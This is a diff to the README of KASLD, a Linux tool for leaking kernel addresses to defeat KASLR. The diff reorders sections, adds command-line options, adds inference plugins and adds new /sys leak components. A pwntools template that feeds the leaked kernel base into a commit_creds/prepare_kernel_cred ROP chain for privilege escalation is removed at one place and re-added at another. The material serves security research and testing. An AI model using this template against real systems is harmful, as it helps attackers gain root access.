@@ -26,10 +26,11 @@ Supports:
 ## Table of Contents
 
 * [Usage](#usage)
+  * [Command-line options](#command-line-options)
   * [Example Output](#example-output)
-  * [pwntools Template](#pwntools-template)
   * [Explain mode](#explain-mode)
   * [Hardening assessment](#hardening-assessment)
+  * [pwntools Template](#pwntools-template)
 * [Building](#building)
 * [Configuration](#configuration)
 * [Architecture and Design](#architecture-and-design)
@@ -76,21 +77,29 @@ Supports:
 
 ## Usage
 
-```
-sudo apt install libc-dev make gcc binutils git
-git clone https://github.com/bcoles/kasld
-cd kasld
-make run
-```
-
 Each component in the `src/` directory is a standalone leak component using
 a different technique to retrieve or infer kernel addresses. The `kasld`
 orchestrator discovers and executes all components, displays results in
 real-time, and produces a section-aware summary with validated addresses
 grouped by kernel section (text, modules, direct map, etc).
 
-After building, the `build/<arch>/` directory is self-contained and can be
-deployed to a target system:
+Fetch and build:
+
+```
+sudo apt install libc-dev make gcc binutils git
+git clone https://github.com/bcoles/kasld
+cd kasld
+make
+```
+
+Run:
+
+```
+./build/<arch>/kasld
+```
+
+The `build/<arch>/` directory is self-contained and can be deployed to a
+target system:
 
 ```
 build/<arch>/
@@ -103,6 +112,27 @@ Modern fully-patched systems with `kernel.dmesg_restrict=1`,
 are expected to return limited results. For testing purposes, the
 [extra/weaken-kernel-hardening](extra/weaken-kernel-hardening) script
 can temporarily relax these settings (requires root).
+
+
+### Command-line options
+
+```
+-j, --json          Machine-readable JSON output
+-1, --oneline       Single-line summary output
+-m, --markdown      Markdown table output
+-c, --color         Colorize text output (auto-detected for TTYs)
+-q, --quiet         Suppress banner, progress, and warnings
+-v, --verbose       Show component output
+-e, --explain       Show technique explanations before each component
+-f, --fast          Use 2s per-component timeout (fast scan mode)
+-w, --workers N     Parallel inference workers (default: nproc; 0 = sequential)
+-x, --experimental  Enable experimental components
+-s, --skip PATTERN  Skip matching components (glob, comma-separated; multiple --skip flags accumulate)
+-H, --hardening     Show post-run hardening assessment
+-t, --timeout N     Per-component timeout in seconds (default: 30)
+-V, --version       Print version and exit
+-h, --help          Show this help
+```
 
 
 ### Example Output
@@ -201,57 +231,6 @@ Physical memory layout:
 
 </details>
 
-### pwntools Template
-
-The `--json` (`-j`) flag emits machine-readable output. The
-`kaslr.virtual.text_base` field contains the leaked kernel text base as
-a hex string, and `kaslr.virtual.slide_bytes` contains the KASLR slide
-as an integer. Both can be consumed directly by pwntools to resolve
-runtime symbol addresses and build a ROP chain.
-
-```python
-#!/usr/bin/env python3
-import json, subprocess, sys
-from pwn import *
-
-# Leak kernel base with KASLD
-result = subprocess.run(
-  [
-    "./build/x86_64-linux-gnu/kasld",
-    "--json",
-    "--fast",
-    "--quiet"
-  ],
-  capture_output=True,
-  text=True
-)
-data = json.loads(result.stdout)
-context.arch = {"x86_64": "amd64"}.get(data["arch"], data["arch"])
-kaslr = data["kaslr"].get("virtual")
-if not kaslr:
-    log.failure("kasld did not find the kernel text base")
-    sys.exit(1)
-text_base = int(kaslr["text_base"], 16)
-slide     = int(kaslr["slide_bytes"])
-log.success(f"kernel text base: {hex(text_base)}  (slide +{hex(slide)})")
-
-# Resolve runtime addresses via vmlinux symbol table
-vmlinux = ELF("vmlinux", checksec=False)
-vmlinux.address = text_base
-commit_creds        = vmlinux.symbols["commit_creds"]
-prepare_kernel_cred = vmlinux.symbols["prepare_kernel_cred"]
-log.info(f"commit_creds:        {hex(commit_creds)}")
-log.info(f"prepare_kernel_cred: {hex(prepare_kernel_cred)}")
-
-# Build ROP chain
-rop = ROP(vmlinux)
-rop.call(prepare_kernel_cred, [0])
-# move rax -> rdi here with a target-specific gadget
-# rop.raw(rop.find_gadget(["mov rdi, rax", "ret"]).address)
-rop.call(commit_creds)
-payload = flat(rop.chain())
-```
-
 ### Explain mode
 
 The `--explain` (`-e`) flag prints a brief technique explanation before
@@ -308,6 +287,56 @@ where it appears in a top-level `"hardening"` object with fields
 `active_defenses`, `suggestions`, `patched_vulns`, `unpatched_vulns`,
 `config_surface`, and `no_mitigation`.
 
+### pwntools Template
+
+The `--json` (`-j`) flag emits machine-readable output. The
+`kaslr.virtual.text_base` field contains the leaked kernel text base as
+a hex string, and `kaslr.virtual.slide_bytes` contains the KASLR slide
+as an integer. Both can be consumed directly by pwntools to resolve
+runtime symbol addresses and build a ROP chain.
+
+```python
+#!/usr/bin/env python3
+import json, subprocess, sys
+from pwn import *
+
+# Leak kernel base with KASLD
+result = subprocess.run(
+  [
+    "./build/x86_64-linux-gnu/kasld",
+    "--json",
+    "--fast",
+    "--quiet"
+  ],
+  capture_output=True,
+  text=True
+)
+data = json.loads(result.stdout)
+context.arch = {"x86_64": "amd64"}.get(data["arch"], data["arch"])
+kaslr = data["kaslr"].get("virtual")
+if not kaslr:
+    log.failure("kasld did not find the kernel text base")
+    sys.exit(1)
+text_base = int(kaslr["text_base"], 16)
+slide     = int(kaslr["slide_bytes"])
+log.success(f"kernel text base: {hex(text_base)}  (slide +{hex(slide)})")
+
+# Resolve runtime addresses via vmlinux symbol table
+vmlinux = ELF("vmlinux", checksec=False)
+vmlinux.address = text_base
+commit_creds        = vmlinux.symbols["commit_creds"]
+prepare_kernel_cred = vmlinux.symbols["prepare_kernel_cred"]
+log.info(f"commit_creds:        {hex(commit_creds)}")
+log.info(f"prepare_kernel_cred: {hex(prepare_kernel_cred)}")
+
+# Build ROP chain
+rop = ROP(vmlinux)
+rop.call(prepare_kernel_cred, [0])
+# move rax -> rdi here with a target-specific gadget
+# rop.raw(rop.find_gadget(["mov rdi, rax", "ret"]).address)
+rop.call(commit_creds)
+payload = flat(rop.chain())
+```
 
 ## Building
 
@@ -323,26 +352,6 @@ make install      # install to /usr/local (PREFIX=/usr/local)
 make uninstall    # remove installed files
 make clean        # remove build directory
 make help         # show all targets and options
-```
-
-Command-line options:
-
-```
--j, --json          Machine-readable JSON output
--1, --oneline       Single-line summary output
--m, --markdown      Markdown table output
--c, --color         Colorize text output (auto-detected for TTYs)
--q, --quiet         Suppress banner, progress, and warnings
--v, --verbose       Show component output
--e, --explain       Show technique explanations before each component
--f, --fast          Use 2s per-component timeout (fast scan mode)
--w, --workers N     Parallel inference workers (default: nproc; 0 = sequential)
--x, --experimental  Enable experimental components
--s, --skip PATTERN  Skip matching components (glob, comma-separated; multiple --skip flags accumulate)
--H, --hardening     Show post-run hardening assessment
--t, --timeout N     Per-component timeout in seconds (default: 30)
--V, --version       Print version and exit
--h, --help          Show this help
 ```
 
 KASLD can be cross-compiled with `make` by specifying the appropriate
@@ -453,9 +462,9 @@ are equivalent. The number of skipped components is noted in the
 
 At phase boundaries the orchestrator runs a set of inference plugins compiled
 directly into the orchestrator binary. Plugins read collected results and
-tighten the constraint bounds used during validation — they may only raise
-`text_base_min`, lower `text_base_max`, or narrow `page_offset_min/max`.
-This commutativity invariant means plugin order within a phase is irrelevant.
+tighten the memory section constraint bounds used during validation. The
+commutativity invariant — plugins may only tighten bounds, never widen them —
+means plugin order within a phase is irrelevant.
 
 Inference plugins run in four phases:
 
@@ -496,7 +505,7 @@ Currently implemented:
 | `min_offset_from_image_size` | POST_COLLECTION | Forbidden lower slots from kernel image size (MIPS/LoongArch) |
 | `module_text_bound` | POST_COLLECTION | Module region → text bounds |
 | `phys_virt_synth` | POST_COLLECTION | Narrows `page_offset_min/max` by synthesising `PAGE_OFFSET = virt − phys + PHYS_OFFSET` from per-component (PHYS/DRAM, VIRT/DIRECTMAP) pairs |
-| `randomize_memory_page_offset` | POST_COLLECTION | Cross-origin min-DIRECTMAP / min-PHYS → `page_offset_base` (x86-64) |
+| `randomize_memory_page_offset` | POST_COLLECTION | Pins `page_offset_base` on x86-64 with CONFIG_RANDOMIZE_MEMORY. Path 1: same-(origin, region, name) PHYS + VIRT/DIRECTMAP pairing. Path 2: cross-origin min-DIRECTMAP / min-PHYS-RAM_BASE fallback. Both paths enforce 1-GiB PUD alignment |
 | `riscv64_fdt_kaslr_seed` | POST_COLLECTION | riscv64 FDT `kaslr-seed` → exact `text_base` |
 | `riscv64_non_efi_phys_base` | POST_COLLECTION | Exact physical base on non-EFI riscv64 |
 | `text_cluster_filter` | POST_COLLECTION | TEXT-result cluster outlier rejection |
@@ -504,6 +513,8 @@ Currently implemented:
 | `x86_32_vmsplit_ceiling` | POST_COLLECTION | x86-32 vmsplit ceiling |
 | `x86_64_coupling_validate` | POST_COLLECTION | x86-64 directmap/text region coupling validation |
 | `x86_64_la57_from_directmap` | POST_COLLECTION | x86-64 L4/L5 paging detection from directmap addresses |
+| `x86_64_vmalloc_base_bound` | POST_COLLECTION | x86-64 CONFIG_RANDOMIZE_MEMORY: `page_offset_base + directmap_size_tb * 1 TiB + PUD_SIZE` → `vmalloc_base` lower bound (chained from `/proc/zoneinfo` `max_pfn`) |
+| `x86_64_vmemmap_base_bound` | POST_COLLECTION | x86-64 CONFIG_RANDOMIZE_MEMORY: `vmalloc_base + VMALLOC_SIZE_TB * 1 TiB + PUD_SIZE` → `vmemmap_base` lower bound; `CPU_ENTRY_AREA_BASE − vmemmap_size` → upper bound |
 | `x86_firmware_memmap_holes` | POST_COLLECTION | x86 `/sys/firmware/memmap` System RAM hole validation |
 
 Inference plugins live in `src/inference/` and register via a linker section
@@ -1287,17 +1298,22 @@ The following KASLD components read from `/proc`:
 The following KASLD components read from `/sys`:
 
 * [acpi_mrrm.c](src/components/acpi_mrrm.c) — physical memory range base addresses from the Intel ACPI MRRM table via `/sys/firmware/acpi/memory_ranges/`
+* [boot_params_e820.c](src/components/boot_params_e820.c) — x86 E820 physical memory map and initrd physical address from `/sys/kernel/boot_params/data`
 * [sysfs_cbmem_address.c](src/components/sysfs_cbmem_address.c) — coreboot CBMEM physical memory addresses from `/sys/bus/coreboot/devices/`
 * [sysfs_cxl_region.c](src/components/sysfs_cxl_region.c) — CXL memory region host physical addresses from `/sys/bus/cxl/devices/`
+* [sysfs_devicetree_elfcorehdr.c](src/components/sysfs_devicetree_elfcorehdr.c) — kdump crash kernel ELF core header physical address from `/sys/firmware/devicetree/base/chosen/`
 * [sysfs_devicetree_initrd.c](src/components/sysfs_devicetree_initrd.c) — initrd address from `/sys/firmware/devicetree/`
 * [sysfs_devicetree_memory.c](src/components/sysfs_devicetree_memory.c) — memory regions from `/sys/firmware/devicetree/`
 * [sysfs_devicetree_reserved_memory.c](src/components/sysfs_devicetree_reserved_memory.c) — reserved DRAM region addresses from `/sys/firmware/devicetree/base/reserved-memory/`
+* [sysfs_devicetree_uefi_mmap.c](src/components/sysfs_devicetree_uefi_mmap.c) — EFI memory map buffer physical address from `/sys/firmware/devicetree/base/chosen/linux,uefi-mmap-*` (UEFI-booted device tree platforms)
 * [sysfs_efi_runtime_map.c](src/components/sysfs_efi_runtime_map.c) — EFI runtime map virtual and physical addresses from `/sys/firmware/efi/runtime-map/`
 * [sysfs_firmware_memmap.c](src/components/sysfs_firmware_memmap.c) — firmware memory map from `/sys/firmware/memmap/`
+* [sysfs_iommu_reserved_regions.c](src/components/sysfs_iommu_reserved_regions.c) — physical DRAM addresses of IOMMU reserved regions from `/sys/kernel/iommu_groups/*/reserved_regions`
 * [sysfs_iscsi_transport_handle.c](src/components/sysfs_iscsi_transport_handle.c) — iSCSI transport handle from `/sys/class/iscsi_transport/`
 * [sysfs-kernel-notes-xen.c](src/components/sysfs-kernel-notes-xen.c) — Xen notes from `/sys/kernel/notes`
 * [sysfs_memory_blocks.c](src/components/sysfs_memory_blocks.c) — memory block addresses from `/sys/devices/system/memory/`
 * [sysfs-module-sections.c](src/components/sysfs-module-sections.c) — module section addresses from `/sys/module/*/sections/`
+* [sysfs_nd_region.c](src/components/sysfs_nd_region.c) — NVDIMM/PMem region physical start addresses from `/sys/bus/nd/devices/region*/`
 * [sysfs_nf_conntrack.c](src/components/sysfs_nf_conntrack.c) — netfilter conntrack hash from `/sys/module/nf_conntrack/`
 * [sysfs_pci_resource.c](src/components/sysfs_pci_resource.c) — PCI BAR addresses from `/sys/bus/pci/devices/`
 * [sysfs_qcom_rmtfs_mem.c](src/components/sysfs_qcom_rmtfs_mem.c) — Qualcomm RMTFS reserved physical memory addresses from `/sys/class/rmtfs/`
